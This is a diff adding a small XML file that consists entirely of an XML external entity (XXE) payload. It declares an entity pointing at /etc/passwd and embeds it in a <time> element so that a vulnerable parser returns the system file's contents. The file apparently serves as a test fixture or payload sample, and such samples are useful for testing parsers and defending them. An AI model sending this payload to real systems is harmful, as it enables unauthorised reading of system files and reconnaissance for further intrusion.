@@ -1,0 +1,7 @@
+<?xml version="1.0" encoding="utf-8" ?>
+<!DOCTYPE foo [
+<!ENTITY pass SYSTEM "/etc/passwd">
+]>
+<user>
+	<time>&pass;</time>
+</user>
